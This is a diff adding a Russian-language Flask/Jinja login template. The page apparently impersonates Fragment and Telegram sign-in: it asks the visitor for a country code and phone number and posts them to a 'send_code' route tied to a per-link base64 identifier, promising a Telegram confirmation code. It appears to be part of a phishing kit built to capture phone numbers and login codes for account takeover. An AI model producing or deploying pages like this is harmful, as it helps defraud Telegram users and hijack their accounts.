@@ -1,0 +1,25 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="description">
+    Войдите, чтобы использовать свой Telegram аккаунт для входа с fragment.com и <span class="highlight">Fragment</span>
+</div>
+<div class="description" style="margin-bottom: 20px;">
+    Пожалуйста, введите номер в <span class="highlight">традиционном формате</span> и мы отправим код подтверждения вашего аккаунта Telegram.
+</div>
+<form method="POST" action="{{ url_for('send_code', base64_id=base64_id) }}">
+    <div class="form-group">
+        <div class="phone-row">
+            <select name="country_code" class="country-code">
+                <option value="7">+7</option>
+                <option value="380">+380</option>
+                <option value="1">+1</option>
+                <option value="44">+44</option>
+                <option value="49">+49</option>
+                <!-- добавьте нужные страны -->
+            </select>
+            <input type="text" name="phone_number" class="phone-number" placeholder="Номер телефона" required>
+        </div>
+    </div>
+    <button type="submit">Далее</button>
+</form>
+{% endblock %}
